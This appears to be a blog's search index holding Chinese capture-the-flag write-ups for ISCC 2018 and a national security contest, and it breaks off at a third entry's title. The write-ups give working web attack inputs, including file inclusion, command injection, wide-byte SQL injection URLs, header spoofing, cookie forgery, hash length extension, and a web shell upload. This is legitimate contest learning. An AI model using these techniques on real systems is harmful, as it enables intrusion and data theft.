<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[iscc2018 wp]]></title>
    <url>%2F2018%2F05%2F14%2Fiscc2018-wp%2F</url>
    <content type="text"><![CDATA[1234567891011&lt;script&gt;if("12345678"==prompt("请输入密码"))&#123;alert("正确");&#125;else&#123;alert("错误");location="http://blog.laphets.com"; #返回网站，请自定义&#125;&lt;/script&gt; 一、WEB1.比较数字大小这题就不用说了,按F12改一下限制输入的最大长度，然后随便输入一个很大很大的数就可以了 Flag: 768HKyu678567&amp;*&amp;K 2.web01代码审计的题目 12345678910 &lt;?phphighlight_file('2.php');$flag='&#123;***************&#125;';if (isset($_GET['password'])) &#123; if (strcmp($_GET['password'], $flag) == 0) die('Flag: '.$flag); else print 'Invalid password'; &#125; ?&gt; 利用strcmp()函数的漏洞，构造数组就可以绕过。 FLAG: ISCC{iscc_ef3w5r5tw_5rg5y6s3t3} 3.本地的诱惑签到题，查看源码就可以了。 4.你能跨过去吗？这题刚开始被题目和页面思路带歪了，一直以为是xss。后来觉得它提供的那个url地址不对劲，越看越像某一种加密。于是复制下来一谷歌才知道，这段url地址经过了ESCAPE加密。解密后是 1http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-&amp;_=1302746925413 又知道了+/v+ 是UTF-7编码，取ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+进行base64解码，得到 &lt;�script&gt;alert(“key:/%nsfocusXSStest%/“)&lt;�/script&gt; 把key的值输入到框里，即可弹出flag FLAG： flag{Hell0World} 5.一切都是套路题目说有个文件忘记删了，一想肯定又是哪个备份文件，拿出之前师傅们送的扫备份文件的脚本，就扫出了index.php.txt。进去之后就是代码审计了 12345678910111213141516171819202122232425&lt;?phpinclude "flag.php";if ($_SERVER["REQUEST_METHOD"] != "POST") die("flag is here");if (!isset($_POST["flag"]) ) die($_403);foreach ($_GET as $k =&gt; $v)&#123; $$k = $$v;&#125;foreach ($_POST as $k =&gt; $v)&#123; $$k = $v;&#125;if ( $_POST["flag"] !== $flag ) die($_403);echo "flag: ". $flag . "\n";die($_200);?&gt; 典型的变量覆盖。 于是构造payload就可以得到flag 6.你能绕过吗?这题本来一直以为是sql注入，后来找了很久没有找到注入点。后来才知道是文件包含，而且通过Fuzz知道我们要在f参数那进行php://filter包含，而且php被过滤，这个只要用大小写就可以绕过。于是构造flag就可以得到flag 那一串base64解密即可。 7.web02一进去就说你不是本地ip，一看就是伪造ip的题目。于是拿XFF，发现居然不行。后来索性把那一堆和ip伪造有关的都添加进去 12345678910X-Forwarded-For: 127.0.0.1Contact: 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Referer: 127.0.0.1From: 127.0.0.1X-Wap-Profile: 127.0.0.1True-Client-IP: 127.0.0.1Client-IP: 127.0.0.1 后来发现是Client-IP起了作用. 得到flag：ISCC{iscc_059eeb8c0c33eb62} 8.请ping我的ip 看你能Ping通吗？说到ping，又给了你一个框，马上想到了命令执行漏洞。刚开始迈出的一步有点脑洞。就是url/?ip=xxxx 然后就按正常的进行ls命令先，题目里说有关被过滤了，试了一下，|，||，&amp;，&amp;&amp;都被过滤了。那也没事啊，用%0a就可以绕过。然后这题后来被出题人改过。之前ls可以直接得到有个叫flag.txt的文件，然后cat它就可以。后来出题人把它藏起来了。想想应该是/home目录。毕竟这个目录经常放一些私人的东西。 9.Please give me username and password!既然说给个username和password，那么我就post过去一个嘛，post居然不行，那就get一个，然后它显示说username不正确，密码太小。然后查看源码，发现有个index.php.txt文件，访问得到源码 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$flag = "***********"; if(isset($_GET['username']))&#123; if (0 == strcasecmp($flag,$_GET['username']))&#123; $a = fla; echo "very good!Username is right"; &#125; else&#123; print 'Username is not right&lt;!--index.php.txt--&gt;';&#125;&#125;elseprint 'Please give me username or password!';if (isset($_GET['password']))&#123; if (is_numeric($_GET['password']))&#123; if (strlen($_GET['password']) &lt; 4)&#123; if ($_GET['password'] &gt; 999)&#123; $b = g; print '&lt;p&gt;very good!Password is right&lt;/p&gt;'; &#125;else print '&lt;p&gt;Password too little&lt;/p&gt;'; &#125;else print '&lt;p&gt;Password too long&lt;/p&gt;'; &#125;else print '&lt;p&gt;Password is not numeric&lt;/p&gt;';&#125;if ($a.$b == "flag") print $flag;?&gt; username可以利用strcasecmp()函数的漏洞，用数组绕过，password它要求长度小于4且要大于999，那么很明显可以用科学记数法，1e3即可。 然后get就可以得到flag flag{ISCC2018_Very_GOOD!} 10.php是世界上最好的语言又是代码审计的 1234567891011121314151617&lt;?phpheader("content-type:text/html;charset=utf-8");if(isset($_POST['username'])&amp;isset($_POST['password']))&#123; $username = $_POST['username']; $password = $_POST['password'];&#125;else&#123; $username="hello"; $password="hello";&#125;if(md5($password) == 0)&#123; echo "xxxxx";&#125;show_source(__FILE__);?&gt; 通过这个，username随便输一个嘛，密码让md5等0，那就在以0e开头的里面随便选一个，比如s878926199a（这个0e开头MD5值小结可以网上搜的到的）。然后输入到框里，提交，然后有关click_here，点开，又有个php代码 1234567 &lt;?phpinclude &apos;flag.php&apos;;$a = @$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);show_source(__FILE__);?&gt; 这个也是之前做过的题。看到Request函数，很明显可以想到文件包含，这里hello是可控的，那么，就可以构造包含语句。构造a=hello);show_source(‘flag.php’);var_dump(即可得到flag ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4} 11.SQL注入的艺术这题经过测试，发现是宽字节注入。 1234http://118.190.152.202:8015/index.php?id=1%bf&apos; order by 8-- - 回显正常http://118.190.152.202:8015/index.php?id=1%bf&apos; order by 9-- -回显异常---&gt;说明有8个字段然后通过http://118.190.152.202:8015/index.php?id=1%bf&apos; union select 1,2,3,4,5,6,7,8-- -得到可注入行。然后就是常规查库，查表，查字段了。就不写了。 FLAG： Y0u_@@33w_dxxmn_9rf0Od 12.试试看进去就一张图片，查看源码，发现一个路径，点进去http://118.190.152.202:8006/show.php?img=1.jpg。 还是一张图片….但是这个看起来就像文件包含嘛。但是感觉并不客观。后来和师傅py才知道师傅获取源码的方法还有被告知flag在上一个目录的flag.php里. 1curl http://118.190.152.202:8006/show.php?img=./jpg/../show.php 其实也可以在burp里面的repeat里，复制这个请求路径，然后在repeat空白处右击paste URL as request 得到源码 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phperror_reporting(0);ini_set('display_errors','Off');include('config.php');$img = $_GET['img'];if(isset($img) &amp;&amp; !empty($img))&#123; if(strpos($img,'jpg') !== false) &#123; if(strpos($img,'resource=') !== false &amp;&amp; preg_match('/resource=.*jpg/i',$img) === 0) &#123; die('File not found.'); &#125; preg_match('/^php:\/\/filter.*resource=([^|]*)/i',trim($img),$matches); if(isset($matches[1])) &#123; $img = $matches[1]; &#125; header('Content-Type: image/jpeg'); $data = get_contents($img); echo $data; &#125; else &#123; die('File not found.'); &#125;&#125;else&#123; ?&gt; &lt;img src="1.jpg"&gt; &lt;?php&#125;?&gt; 通过对那个preg_match()函数里正则的分析，这里传入参数必须要有jpg。于是构造payload 1?img=php://filter/read=convert.base64-encode/resource=../flag.php|jpg 得到flag：flag{1ntere5ting_PHP_Regu1ar_express1onssssss} 补充:（preg_match函数）通过这题，还有当时问了一个学长一晚上。。。我对preg_match函数的理解加深了挺多。 preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 12preg_match函数主要参数有5个，$pattern、$subject、$matches、$flag、$offset，前2个必选，后3个可选，比较麻烦的就在$matches 上 手册里对其的定义是如果提供了参数matches，它将被填充为搜索结果。 \$matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。何为捕获组，简单来说，就是在正则中用小括号括起来的就是一个捕获组，捕获组编号由1开始，因为0是用来表示匹配到的完整字符串，而捕获组的编号就是preg_match() 函数中的\$matches 的数组下标。 先以一个捕获组来说吧，比如: 1234567&lt;?php error_reporting(0); preg_match("/(\d)/", "abcdefg123456ABCD", $matches); echo $matches[0]; echo $matches[1];?&gt; 这个结果输出了2个1。这说明\$matches 的确保存了匹配到的文本，并且整个函数只匹配了一次。换成preg_match_all()试试看能不能匹配多次，这里换一个更容易看出效果的例子 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); preg_match_all("/(\d)/", "abcdefg123456ABCD", $matches); var_dump($matches[0]); var_dump($matches[0][0]);?&gt; 输出为 //第一种 array(6) &#123; [0]=&gt; string(1) "1" [1]=&gt; string(1) "2" [2]=&gt; string(1) "3" [3]=&gt; string(1) "4" [4]=&gt; string(1) "5" [5]=&gt; string(1) "6"&#125;//第二种string(1) "1" 在preg_match_all() 中，\$matches 是一个多维数组，要访问的话需要使用多维数组下标，上面脚本的输出证明了_all 的确是多次匹配，下一次匹配从上一次匹配结束开始. 那如果有多个捕获组，我们再来试试。 12345678&lt;?php preg_match('/([^|]*)([^php]*)/','flag000000000.php|jpg',$matches); echo $matches[0]; echo $matches[1]; echo $matches[2]; ?&gt; 输出为: $matches[0]为：flag000000000.php|j $matches[1]为:flag000000000.php $matches[2]为:|j 从这个结果我们不仅可以验证我们前面那个”preg_match()只匹配了一次就没有匹配了“的结论，还可以知道： 1$matches[0]输出为flag000000000.php|j，是把2个捕获组匹配到的综合起来。这说明匹配有顺序。就是先匹配第一个捕获组，匹配到flag000000000.php。然后匹配第二个捕获组，第二个捕获组从flag000000000.php后面的|开始匹配，匹配到jpg的p停止，所以$matches[0]的结果是flag000000000.php|j。 还有一种情况 123456789101112131415&lt;?php error_reporting(0); preg_match("/([^php]*)([ph]*)([^|])/i", "flag.php|jpg", $matches); echo $matches[0]; echo $matches[1]; echo $matches[2]; echo $matches[3];?&gt;//输出"flag.php" "flag." "ph""p" 这里第二个捕获组只匹配到了ph，而没有匹配后面那个p,而是第三个捕获组匹配了那个p。我们把第三个捕获组删掉之后，反而第二个捕获组能够匹配到后面的那个p。所以就猜是为了满足整个正则表达式的完整才将p给了第三个捕获组，如果第二个捕获组就将p吃了，那下一个字符就是 | ，第三个捕获组的开始点就在这，明显不匹配，那岂不是就找不到符合条件的字符串？但是明明是有符合的flag.php，为了将3个捕获组一起满足，php将第二个p 给了第三捕获组。——&gt;&gt;该猜想引用一个学长的博客。 13.Only admin can see flag这题查看源码，可以知道index.txt文件。访问就可以得到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude 'sqlwaf.php';define("SECRET_KEY", "................");define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $iv=''; for($i=0;$i&lt;16;$i++)&#123; $iv.=chr(rand(1,255)); &#125; return $iv;&#125;function login($info)&#123; $iv=get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is *************&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'; die();&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;if (isset($_POST['username'])&amp;&amp;isset($_POST['password'])) &#123; $username=waf((string)$_POST['username']); $password=waf((string)$_POST['password']); if($username === 'admin')&#123; exit('&lt;p&gt;You are not real admin!&lt;/p&gt;'); &#125;else&#123; $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;&#125;?&gt; 看到这个代码，看到iv，cipher，马上想起之前做的一道题。这题就是考的是CBC翻转攻击。好像连源码都一模一样…..（详细见https://blog.csdn.net/csu_vc/article/details/79619309） 14.Collide进入题目，查看源码，发现个index.txt,访问得到源码： 1234567891011121314151617181920&lt;?phpinclude "secret.php";@$username=(string)$_POST['username'];function enc($text)&#123; global $key; return md5($key.$text);&#125;if(enc($username) === $_COOKIE['verify'])&#123; if(is_numeric(strpos($username, "admin")))&#123; die($flag); &#125; else&#123; die("you are not admin"); &#125;&#125;else&#123; setcookie("verify", enc("guest"), time()+60*60*24*7); setcookie("len", strlen($key), time()+60*60*24*7);&#125;show_source(__FILE__); 从小组师傅那知道这是hash长度扩展攻击。然后在p神的一篇文章里知道这个可以用HashPump来解决。 （http://www.cnblogs.com/pcat/p/5478509.html） 分析源码得到： 自定义函数enc()里定义了一个$key，然后返回把key和text结合起来md5加密的值。虽然我们不知道key的值，但是通过查看cookie可以知道len为46。同时我们还知道了enc(guest)返回的值就是78cfc57d983b4a17e55828c001a3e781 再看输出flag的条件是要求username含有admin。 综合一下上面的信息，就是一个长度已知，数值未知的值key，同时知道key连接上一个已知的值(guest)的md5 值(78cfc57d983b4a17e55828c001a3e781)，需要满足key 加上另一个可控的值(\$username) 的MD5 等于一个已知的值。这里面key 是密文，长度46，后面加上guest，签名是78cfc57d983b4a17e55828c001a3e781，而我们需要加上的数据是admin。 然后用HashPump 把新的签名替换掉之前旧的。然后第二是post 的值，把\x 改成%，提交即可得到flag。 #二、MISC 1.What is that？把图片解压出来，是一个手指这下面，觉的会不会是改高度。于是看了图片的详细信息。果然它是626x500 于是丢到winhex里，改个高度。保存打开即可。 00 00 00 0D 说明IHDR头块长为13 49 48 44 52 IHDR标识 00 00 02 72 宽为626 00 00 01 F4 高为500 我们把搞改成626.即可。 2.数字密文69742773206561737921 本来以为这个是ascii码，然后俩俩分开，发现27没有对应的字母。所以看来这个不是ascii码。又题目说很简单。。。于是试了一下16进制。就出来了。 3.秘密电报打开文件，是一串ABAB的字符串。之前做过这个类型的。一看就是培根密码。丢到在线解密器里解密即可。 4.重重谍影查看附件。里面刚开始是一个base64，解码后像url，这样不断的循环。解到最后 123U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc= 这一串是AES。解密得 12答案就是后面这句但已加密缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗 下面那一句在别人的提醒下才知道这个叫土豆文。然后找到了一个解密网站。解密得到的答案tm被气死 flag就是———&gt;&gt;&gt;&gt;“把我复制走”。 5.有趣的ISCC下载下来是iscc的图标。用winhex打开。 拖到最后，发现一大串unicode。复制出来解密即可。 6.Where is the FLAG？文件下载下来还是iscc的图标。继续用winhex打开 发现右侧栏有个内容为Adobe Firework。想起之前做的一题。用firework打开，然后得到隐藏的图层。然后把它拼起来形成一个二维码，扫描即可。 7.凯撒十三世这样一串ebdgc697g95w3 它说凯撒，于是就凯撒解密，移位13位得roqtp697t95j3 然后对应键盘密码 例如r—-&gt;f，o—&gt;l…..以此类推就出flag了. 8.一只猫的心思这题考的是文件头和文件尾。 12345678910111213141516171819202122232425262728293031323334JPEG (jpg)， 文件头FFD8FF 文件尾 FFD9PNG (png)， 文件头89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3B ZIP Archive (zip)，文件头:504B0304 文件尾：50 4BTIFF (tif)， 文件头:49492A00 Windows Bitmap (bmp)， 文件头：424D CAD (dwg)， 文件头：41433130 Adobe Photoshop (psd)， 文件头：38425053 Rich Text Format (rtf)， 文件头：7B5C727466 XML (xml)， 文件头：3C3F786D6C HTML (html)， 文件头：68746D6C3EEmail [thorough only] (eml)， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D546864 把图片用winhex打开，然后从FFD9后面的DDCF开始复制下来，然后新建一个hex文件，粘贴进去，保存为doc文件。 打开doc文件。得到一段话 1名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通 看这么多不认识的汉字，还是用刚才的土豆文解密得 1523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46 16进制转化一下 1R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF 当时不知道接下来改怎么解密。后来一个大佬让我看一下文件名–&gt;“163264”。哦，先base64，再base32，再base16再base64，再base32，再base64即可。 FLAG： F1a9_is_I5cc_ZOl8_G3TP01NT 9.暴力XX不可取下载是个压缩包，里面有个加密的flag.txt。排除了爆破和明文攻击。只能是伪加密了。所以就按照伪加密的套路弄就好了。 解压出来的flag.txt里面的内容直接提交错误，凯撒解密一下就出来了。 #]]></content>
  </entry>
  <entry>
    <title><![CDATA[第四届全国网络空间安全技术大赛wp]]></title>
    <url>%2F2018%2F05%2F13%2F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[一、WEBwelcome签到题就不说了。 1.Web1进入题目，就提示我们login，然后跳转到登陆页面。看到有个注册，第一直觉让我随便来注册一个账号。然后用这个账号登陆。 看到说flag在flag.php里，于是来访问一下flag.php,它提示only admin can get the flag，然后重新跳转到登陆页面。刚才好像登陆进去时有个修改密码，马上想到会不会是任意密码重置漏洞.于是再次登陆.按修改密码，同时按F12查看此时的cookie, 那个cookie里username参数的值base64解码后正好是我们所注册的用户名hahahahaha,所以想着把admin进行base64放进去能不能就以admin登陆。于是试了一下，把cookie改好，然后在这个修改密码的页面修改一下密码，比如123456789。提示修改成功，然后跳转回登陆框，于是我们现在来试试以admin为用户名，密码为123456789来登陆,果然进去了.跳转到一个manage.php。 想着既然都admin登陆了，就直接访问flag.php嘛，但是居然还是提醒只有admin才行，并又跳转回去。问了小组师傅才知道，从这里就可以知道如果不以服务器主人的身份访问都会被跳转。想到要以服务器主人的身份访问，就想到了ssrf漏洞。这个是这道题比较脑洞的地方。毕竟给个框框还有上传的，很容易往xss或upload上想。重新看了一遍ssrf的博文之后，就知道这题就只要在远程图片地址上http://127.0.0.1/flag.php即可。这里坑的是，写上之后，它变成了一个jpg文件，然后给出了路径，访问那个路径变成这样 确实是一张图片，但是好像没有什么内容诶。后来有个师傅提醒….把这个图片保存到本地然后用记事本打开就得到了flag了……. flag{dbf6e52d69973dd16d87d4a8c3816ca9} 2.web2这题进去之后是个登陆框，但是tm可气的是，这个登陆框居然….居然是假了。想了很久没思路。。。后来知道有一个扫目录结构的工具(dirsearch)，用了才知道好神奇（手动惊讶！）。于是用这个工具扫一梭子 前面那一大堆/.git/让我一下子想起了前一段做题时下载的GitHack工具，就是把git文件还原。这里面还有有upload.php。于是工具再走一波，得到了好多源码. 最好奇的其实就是那个upload.php了，因为刚才访问它的时候显示了个who are you，然后也和web1一样跳转到那个登陆框.但是这次那个登陆框是虚的，于是想到了用cookie。点击查看它的源码 12345678910111213141516171819202122232425262728293031323334&lt;?php function Administrator($value)&#123; if(empty($_COOKIE['in_adminid']) || empty($_COOKIE['in_adminexpire']) || $_COOKIE['in_adminexpire']!==md5($_COOKIE['in_adminid'].$_COOKIE['in_adminname'].$_COOKIE['in_adminpassword'].$_COOKIE['in_permission']))&#123; return False; &#125; setcookie("in_adminexpire",$_COOKIE['in_adminexpire'],time()+1800); if(!empty($_COOKIE['in_permission']))&#123; $array=explode(",",$_COOKIE['in_permission']); $adminlogined=false; for($i=0;$i&lt;count($array);$i++)&#123; if($array[$i]==$value)&#123;$adminlogined=true;&#125; &#125; if(!$adminlogined)&#123; return False; &#125; &#125;else&#123; return False; &#125; return true; &#125; if (Administrator(2))&#123; if(isset($_FILES['file']))&#123; $filename = './img/img'.rand().'.jpg'; move_uploaded_file($_FILES["file"]["tmp_name"],$filename); header('Refresh:3,url=index.php?file=upload.php'); echo "Upload $filename Success!"; die; &#125; &#125;else&#123; header('Refresh:3,url=index.php?file=login.html'); echo "Who are you!"; die; &#125;?&gt; 我们发现让我们能够进入upload.php的是上半部分代码。这段代码通过 cookie 验证登录用户信息，将 “in_adminid”,”in_adminname”,”in_adminpassword”,”in_permission” 拼接在一起 MD5 后与 “in_adminexpire” 的值比较，左右两值相等就通过验证，再通过 “in_permision” 验证该用户是否有本页面权限。因为 cookie 我们是可控的所以我们很容易绕过它的验证方式。于是构造cookie如下： 然后再访问upload.php，发现就进去了. 这里有关上传框，我们再来看一下upload.php下半部分的代码。你传入任何文件都会给你输出jpg文件。这里我们可以做一个实验。新建一个txt文件，里面写上php代码。如 1&lt;?php echo "hello" ?&gt; 然后上传上去，得到一个以jpg文件结尾的路径.然后用index.php的文件包含这个文件。结果如下: 说明我们上传上去的txt文件输入在上传后变成了jpg文件，但是在index.php里被看作php文件来处理。所以echo出来hello。 补上index.php的源码:(和fl4g.php加密方式一样) 123456789101112131415&lt;?php error_reporting(0); if(!isset($_GET['file'])||empty($_GET['file']))&#123; header('Refresh:1,url=index.php?file=login.html'); die; &#125; $file = $_GET['file']; if ((strpos($file,':')!==false))&#123; header('Refresh:1,url=index.php?file=login.html'); echo "illgal filename!!"; die; &#125; include_once($file); ?&gt; 于是我们写入一个一句话木马.上传上去，同样的操作，然后用菜刀连接就可以getshell了. 看到了fl4g.php,原来以为就这样结束了，结果打开是乱码，下载下来还是乱码。 本来以为题目被人破坏了，后来小组师傅告诉我，让我去搜前面那几个单词的字符串。才知道，原来这是一种加密形式。叫做php_screw .在github里找到解密脚本。里面还需要解密还需要找到服务器端php_screw.so来查看PM9SCREW,PM9SCREW_LEN和pm9screw_mycryptkey的值。在菜刀里没找到这个文件，后来又是小组师傅的提醒，在php.ini文件里有这个文件的路径.于是，php.ini嘛，就要得到phpinfo，根据刚才说的，上传上去的txt被index.php当成php执行了。所以上传一个写有 1&lt;?php phpinfo(); ?&gt; 的txt文件，上传上去，得到路径，然后访问就得到了phpinfo 于是尝试直接访问php.ini，结果失败了。所以又用刚才的思路，写一个txt文件 刚开始用的是include包含，结果不行。后来用file_get_Content，就可以了。 在这里我们知道了php_screw.so文件的路径，于是直接访问. 还是一堆乱码，后来知道这是bin文件，浏览器不能正常显示。于是保存下来，按教程里用ida打开来找那三个值。 发现没找到。问了师傅和加上百度之后知道了，我们刚才那个fl4g.php开头那个PM9SCREW之所以显示的原因就是因为这三个值没有修改，是默认的。于是，打开我的Ubuntu，按照里面的教程，一步步的，flag就出来了。 这里有个坑点就是：在sudo ./decode path时那个path一定要是完整的路径。我本来把待解密的php文件放到同一目录，所以就直接sudo ./decode fl4g.php，结果显示段错误。解决了一晚上加一早上都没解决….后来有个师傅找到了这个问题的解决方法。（好像说mac就不用写完整的路径）。 二、miscmisc1看到图片，马上右击保存下来。用记事本打开无果。试试改后缀名为zip，果然是一个压缩包.里面有个加密的txt文件。因为没有告诉我们密码有几位，强行爆破应该不可能。而且里面只有一个文件，明文攻击也不可能。于是就剩下伪加密了。用winhex打开,因为刚做过iscc里面一道题，所以很容易就找到了 把那个01改成00即可。保存，之后发现txt就没有加密了。点开txt文件 这个很明显是base64，但是总不能一个个的解密，然后拼在一起好像也不对。后来才知道这是base64隐写。 在百度里找到解码脚本。运行即可。 还是太菜，只会这几题了…….]]></content>
  </entry>
  <entry>
    <title><![CDATA[mozhe 靶场做题记录]]></title>
    <url>%2F2018%2F05%2F08%2Fmozhe-%E9%9D%B6%E5%9C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
